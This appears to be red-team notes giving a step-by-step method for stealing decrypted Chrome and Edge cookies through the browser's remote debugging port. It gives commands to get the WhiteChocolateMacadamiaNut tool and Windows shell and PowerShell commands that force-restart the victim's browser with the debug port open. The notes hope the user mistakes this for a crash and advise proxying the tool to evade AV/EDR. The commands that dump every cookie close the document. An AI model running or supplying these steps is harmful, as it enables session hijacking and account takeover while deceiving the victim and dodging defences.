The following is one method for remotely stealing browser cookies from Chrome. 
This is also possible with Microsoft Edge which uses the Chromium framework.

This method uses the built in Chrome debugging port to snag the cookies after Chrome has already decrypted them.

First, you'll need a working copy of WhiteChocolateMacadamiaNut: https://github.com/slyd0g/WhiteChocolateMacademiaNut
This tool is written on Go and can be downloaded and compiled with the following command:

  go get github.com/slyd0g/WhiteChocolateMacademiaNut
  
In order to get access to the cookies, we'll need to restart the user's browser with the debugging port open. 
We can do this with 2 shell commands or 2 PowerShell commands. Select the method that works best for your particular engagement.
These two commands shut down the current running browser process, thenimmediately restart it with the debugging port open and reloading
the previous user session. You will need to know the correct path to the user's Chrome data folder. The user will see the browser close then
immediately re-open and ask if it should load the previously running sessions. Hopefully they just assume Chrome crashed and move on with their life.

Windows shell commands:

  taskkill /F /IM chrome.exe && "C:\Program Files\\Google\Chrome\Application\chrome.exe" --remote-debugging-port=9222 --restore-last-session --user-data-dir="C:\Users\<username>\AppData\Local\Google\Chrome\User Data"

Windows PowerShell commands:

  Get-Process "chrome" | Stop-Process
  Start-Process "chrome.exe" -ArgumentList '--remote-debugging-port=9222 --restore-last-session --user-data-dir="C:\Users\<username>\AppData\Local\Google\Chrome\User Data"'

At this point, Chrome is running with the debugging port open and you can use WhiteChocolateMacadamiaNut to steal the cookies. OPSEC Note: It's best to
proxy this tool to your target rather than write it to disk. It can be done either way, but writing it to disk will require that you bypass AV/EDR.

  WhiteChocolateMacadamiaNut -p 9222 -d cookies -f raw <-- This will export all the decrypted cookies in JSON format
  
  WhiteChocolateMacadamiaNut -p 9222 -d cookies -f human <-- This will export all the decrypted cookies in human readable format
